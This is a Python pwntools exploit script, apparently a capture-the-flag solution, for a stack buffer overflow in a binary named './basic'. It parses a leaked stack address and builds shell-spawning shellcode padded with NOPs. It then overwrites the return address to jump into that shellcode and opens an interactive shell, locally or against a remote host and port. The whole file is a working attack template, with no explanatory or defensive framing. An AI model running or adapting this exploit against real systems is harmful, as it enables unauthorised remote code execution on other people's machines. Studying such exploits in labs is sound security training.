#!/usr/bin/python3
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break error
continue
'''.format(**locals())


# Binary filename
exe = './basic'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.pc)  # x86
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to EIP
padding = 92 #find_eip(cyclic(200))
info("Offset: " + str(padding))

io = start()

# Get to leaked address
io.recvuntil("Loading in response field, ")

# Get the stack address so we know the base address of the buffer
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked stack_addr: %#x", stack_addr)

# Build shellcode (cat flag.txt or spawn shell)
shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())
# shellcode = asm(shellcraft.cat('flag.txt'))

# Pad shellcode with NOPs until we get to return address
padding = asm('nop') * (padding - len(shellcode))

# Build the payload
payload = flat([
    shellcode,
    padding,
    stack_addr
])

write("./payload", payload)

io.sendlineafter("> ", payload)

# Or, spawn a shell
io.interactive()
